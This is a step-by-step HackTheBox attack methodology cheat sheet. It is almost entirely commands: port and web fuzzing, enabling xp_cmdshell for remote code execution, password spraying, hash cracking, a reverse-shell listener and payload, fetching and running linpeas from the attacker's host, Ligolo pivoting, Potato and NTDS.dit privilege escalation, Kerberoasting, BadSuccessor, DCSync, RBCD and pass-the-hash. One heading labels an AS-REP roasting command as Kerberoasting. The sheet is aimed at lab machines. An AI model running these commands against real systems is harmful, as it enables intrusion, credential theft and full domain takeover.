## Phase 0 - Preparation

```bash
# Create working directory
mkdir -p ~/HTB/<machine>/{nmap,web,smb,ad,loot,tools}
cd ~/HTB/<machine>

# Add target to /etc/hosts
echo "10.129.x.x  <machine>.htb" | sudo tee -a /etc/hosts

# Environment variables
export IP=10.129.x.x
export DOMAIN=<machine>.htb
export DC=DC01.<machine>.htb
```

## Phase 1 - Reconnaissance

### Nmap

```bash
# Quick all-port scan
sudo nmap -p- --min-rate 10000 -Pn $IP -oN nmap/ports.txt

# Detailed scan on found ports
sudo nmap -sC -sV -Pn -p <PORTS> $IP -oN nmap/detailed.txt

# UDP (if needed)
sudo nmap -sU --top-ports 20 $IP -oN nmap/udp.txt
```

### Context Identification

```text
Open ports -> machine type:

80/443 only           -> Pure web app
445 + 88 + 389        -> Active Directory (DC)
1433                  -> MSSQL
3306                  -> MySQL
21                    -> FTP
22                    -> SSH (Linux)
5985/5986             -> WinRM (Windows)
2049                  -> NFS
6379                  -> Redis
8080/8443/8888        -> Custom web app
```

## Phase 2 - Service Enumeration

### Web (80/443/8080)

```bash
# Technologies
whatweb http://$IP
curl -I http://$IP

# Directory fuzzing
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403

# File fuzzing
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.config

# Subdomain / vhost fuzzing
ffuf -u http://10.129.242.203 -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>

# CMS
wpscan --url http://$IP -e ap,u    # WordPress
```

### Web Vulnerabilities to Look For

```text
SQLi      -> sqlmap -u "http://$IP/page?id=1" --dbs
LFI/RFI   -> ../../../../etc/passwd
SSTI      -> {{7*7}}
File upload -> webshell
Default creds -> admin:admin, admin:password
```

### SMB (445)

```bash
# Anonymous enumeration
nxc smb $IP
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares

# List shares
smbclient -L //$IP -N

# Access shares
smbclient //$IP/<share> -N

# RID brute -> users
nxc smb $IP -u '' -p '' --rid-brute
nxc smb $IP -u 'guest' -p '' --rid-brute

# Vulnerabilities
nxc smb $IP --gen-relay-list relay.txt    # SMB signing
```

### MSSQL (1433)

```bash
# Connection
mssqlclient.py '$DOMAIN/<user>:<pass>@$IP' -windows-auth
```

```sql
-- In the MSSQL console
SELECT name FROM sys.databases;
USE <db>; SELECT table_name FROM information_schema.tables;
SELECT * FROM users;
```

```bash
# RID brute via MSSQL
nxc mssql $IP -u <user> -p <pass> --rid-brute
```

```sql
-- RCE if sysadmin
EXEC xp_cmdshell 'whoami';
-- If disabled:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Active Directory (88/389/445)

```bash
# Enumeration without credentials
nxc smb $IP                                    # hostname, OS, signing
ldapsearch -x -H ldap://$IP -b "DC=<domain>,DC=htb" -s base

# With credentials
bloodhound-python -u <user> -p <pass> -d $DOMAIN -dc $DC -ns $IP -c All
nxc smb $IP -u <user> -p <pass> --users
nxc smb $IP -u <user> -p <pass> --groups
nxc smb $IP -u <user> -p <pass> --pass-pol

# Kerberoasting (without credentials)
GetNPUsers.py '$DOMAIN/' -no-pass -usersfile users.txt -dc-ip $IP

# AS-REP Roasting
GetNPUsers.py '$DOMAIN/' -no-pass -usersfile users.txt -dc-ip $IP -format hashcat
```

### Other Services

```bash
# FTP (21)
ftp $IP                     # anonymous login
nxc ftp $IP -u anonymous -p anonymous

# SSH (22)
ssh <user>@$IP
ssh-audit $IP               # version + vulnerabilities

# NFS (2049)
showmount -e $IP
sudo mount -t nfs $IP:/<share> /mnt/nfs

# Redis (6379)
redis-cli -h $IP
redis-cli -h $IP INFO

# SNMP (161 UDP)
snmpwalk -c public -v1 $IP
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP
```

## Phase 3 - Foothold

### Password Attacks

```bash
# Password spray WinRM
nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success

# Password spray SMB
nxc smb $IP -u users.txt -p passwords.txt --continue-on-success

# Password spray MSSQL
nxc mssql $IP -u users.txt -p passwords.txt --continue-on-success

# Hashcat PBKDF2 (Flask/Django)
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt

# Hashcat NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Shell Obtained - Stabilization

```bash
# Reverse shell Windows -> Kali
# On Kali
rlwrap nc -lvnp 4444

# On target (PowerShell)
powershell -e <BASE64_REVERSE_SHELL>

# Evil-WinRM (if WinRM open)
evil-winrm -u <user> -p <pass> -i $IP
```

## Phase 4 - Immediate Post-Exploitation (As Soon as Shell Obtained)

### Windows

```powershell
# 1. Context
whoami /all
net user <user> /domain
systeminfo | findstr /i "OS Name\|Domain"

# 2. Actual internal ports
netstat -ano | findstr "LISTENING"

# 3. Internal network
ipconfig /all

# 4. Interesting files
dir C:\Users\<user>\Desktop\
dir C:\Users\<user>\Documents\
dir C:\inetpub\wwwroot\
type C:\Windows\System32\drivers\etc\hosts

# 5. Processes
tasklist /v

# 6. WinPEAS
upload winPEASx64.exe
.\winPEASx64.exe
```

### Linux

```bash
# 1. Context
id && whoami
cat /etc/passwd | grep -v nologin
sudo -l

# 2. SUID
find / -perm -u=s -type f 2>/dev/null

# 3. Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# 4. LinPEAS
wget http://<KALI_IP>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

## Phase 5 - Network Pivoting (Ligolo)

### Kali Setup (One Time)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

### Windows Target

```powershell
upload agent.exe
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

### Kali - Activate Tunnel

```bash
ligolo-ng >> session
ligolo-ng >> start

# Loopback route to DC
sudo ip route add 240.0.0.1/32 dev ligolo

# Internal network route
sudo ip route add 192.168.x.0/24 dev ligolo

# Kerberos time sync
sudo ntpdate 240.0.0.1
```

## Phase 6 - Privilege Escalation

### Windows - Checklist

```text
SeImpersonatePrivilege  -> PrintSpoofer / GodPotato / JuicyPotato
SeBackupPrivilege       -> Direct NTDS.dit dump
SeDebugPrivilege        -> LSASS dump (mimikatz)
AlwaysInstallElevated   -> Malicious MSI
Misconfigured services  -> sc.exe / accesschk.exe
DLL Hijacking           -> procmon
Unquoted Service Path   -> spaces in path
```

```powershell
# Potato (SeImpersonate)
upload GodPotato.exe
.\GodPotato.exe -cmd "cmd /c whoami"

# SeBackupPrivilege -> NTDS.dit
upload SeBackupPrivilegeCmdLet.dll
Import-Module .\SeBackupPrivilegeCmdLet.dll
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit .\ntds.dit
reg save HKLM\SYSTEM .\system.hive
# On Kali:
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

### Active Directory - BloodHound Checklist

```bash
# Collect BloodHound via Ligolo
bloodhound-python -u <user> -p <pass> \
  -d $DOMAIN -dc $DC \
  -ns 240.0.0.1 -c All

# Import into BloodHound GUI
# Priority queries:
```

```cypher
-- Path to Domain Admins
MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"})) RETURN p

-- CreateChild -> BadSuccessor (WS2025)
MATCH p=(u:User)-[:CreateChild]->(o:OU) RETURN p

-- Kerberoastable
MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name

-- AS-REP Roastable
MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name

-- DCSync
MATCH p=(u)-[:DCSync|GetChangesAll|GetChanges*1..]->(d:Domain) RETURN p
```

### Common AD Exploitations

```bash
# Kerberoasting
GetUserSPNs.py '$DOMAIN/<user>:<pass>' -dc-ip 240.0.0.1 -request
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roasting
GetNPUsers.py '$DOMAIN/<user>:<pass>' -dc-ip 240.0.0.1 -request
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# BadSuccessor (WS2025 + CreateChild)
.\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Staff,DC=<domain>,DC=htb" /account:<user> /name:evil_dMSA
.\Rubeus.exe asktgt /user:<user> /password:<pass> /domain:$DOMAIN /enctype:aes256 /nowrap
.\Rubeus.exe asktgs /targetuser:evil_dMSA$ /service:krbtgt/$DOMAIN /dmsa /opsec /outfile:dMSA.kirbi /ticket:<TGT>
# On Kali:
ticketConverter.py dMSA.kirbi dMSA.ccache
export KRB5CCNAME=dMSA.ccache
secretsdump.py -k -no-pass -just-dc-ntlm -dc-ip 240.0.0.1 -target-ip 240.0.0.1 $DC

# GenericAll on a user -> reset password
net rpc password <target_user> <new_pass> -U '$DOMAIN/<user>%<pass>' -S $DC

# WriteDacl -> DCSync self-grant
dacledit.py -action write -rights DCSync -principal <user> -target-dn 'DC=<domain>,DC=htb' '$DOMAIN/<user>:<pass>' -dc-ip 240.0.0.1

# Shadow Credentials (GenericWrite)
pywhisker.py -d $DOMAIN -u <user> -p <pass> --target <target> --action add -dc-ip 240.0.0.1

# RBCD (AllowedToAct)
rbcd.py -delegate-to '<target>$' -delegate-from '<controlled>$' -action write '$DOMAIN/<user>:<pass>' -dc-ip 240.0.0.1
getST.py -spn 'cifs/<target>.$DOMAIN' -impersonate Administrator '$DOMAIN/<controlled>$' -hashes :<hash> -dc-ip 240.0.0.1
```

## Phase 7 - Root / Administrator

```bash
# Pass-the-Hash
evil-winrm -u Administrator -H <NTLM> -i $IP

# Pass-the-Ticket
export KRB5CCNAME=<ticket>.ccache
psexec.py -k -no-pass $DC

# Flags
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<user>\Desktop\user.txt
cat /root/root.txt
cat /home/<user>/user.txt
```

## Universal Decision Tree

```text
NMAP
 |-- Web (80/443) -------------- Gobuster -> SQLi/LFI/Upload -> Shell
 |-- MSSQL (1433) -------------- RID brute -> DB dump -> creds -> spray
 |-- SMB (445) ----------------- Shares -> credentials -> relay
 |-- WinRM (5985) -------------- Direct shell if creds
 |-- SSH (22) ------------------ Brute / key leak

SHELL OBTAINED
 |-- systeminfo -> OS version
 |    |-- WS2025 -> BadSuccessor
 |    |-- WS2019/2022 -> noPac / PrintNightmare / others
 |-- netstat -> hidden ports -> Ligolo
 |-- ipconfig -> internal network -> Ligolo pivot
 |-- whoami /all -> privileges
      |-- SeImpersonate -> Potato
      |-- SeBackup -> NTDS dump
      |-- Normal -> BloodHound -> AD path

BLOODHOUND
 |-- CreateChild OU -> BadSuccessor
 |-- GenericAll -> Shadow Creds / Password reset
 |-- WriteDacl -> DCSync grant
 |-- Kerberoastable -> hashcat
 |-- RBCD -> getST impersonate
 |-- DCSync direct -> secretsdump

ROOT
 |-- PTH / PTT -> Administrator -> flags
```

### Three Golden Rules

```text
1. BloodHound as soon as first AD shell - it reveals 90% of attack paths.
2. Ligolo systematically to get access to KDC/LDAP/SMB.
3. netstat and systeminfo before anything else - they guide everything that follows.
```
